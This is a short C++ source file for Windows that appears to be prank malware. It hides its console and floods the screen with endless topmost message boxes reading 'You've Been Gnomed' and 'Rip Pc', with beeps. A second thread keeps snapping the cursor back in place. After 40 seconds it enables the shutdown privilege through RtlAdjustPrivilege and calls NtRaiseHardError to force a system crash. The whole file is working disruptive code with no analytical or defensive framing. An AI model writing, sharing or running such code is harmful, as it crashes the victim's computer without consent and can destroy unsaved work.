#include <thread>
#include <iostream>
#include <windows.h>
#include <synchapi.h>
#pragma comment(lib, "ntdll.lib")

void Sleep(
	DWORD dwMilliseconds
);



EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
	ULONG    Privilege,
	BOOLEAN  Enable,
	BOOLEAN  CurrentThread,
	PBOOLEAN Enabled
	);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, 
	ULONG NumberOfParameters, 
	PULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, 
	ULONG ValidResponseOption, 
	PULONG Response
	);




void WarpCursor() {
POINT cursor;
	while (true) {
	GetCursorPos(&cursor);
	Sleep(1'000);
	SetCursorPos(cursor.x ,cursor.y);
	}
	}


void payload() {
	while(true) {
		MessageBoxA(0, "You'e Been Gnomed", "You've Been Gnomed", MB_TOPMOST | MB_ABORTRETRYIGNORE);
		MessageBoxA(0, "Rip Pc", "F", MB_TOPMOST | MB_ABORTRETRYIGNORE);	
		MessageBeep(MB_ICONINFORMATION);
	}
}


int main() {
	BOOLEAN bl;
	POINT cursor;
	unsigned long response;

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	std::thread t1 (payload);
	std::thread t2(WarpCursor);

		Sleep(40'000);
		RtlAdjustPrivilege(19, true, false, &bl);
		MessageBeep(MB_ICONINFORMATION);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

		t1.join();
		t2.join();
	return 0;
}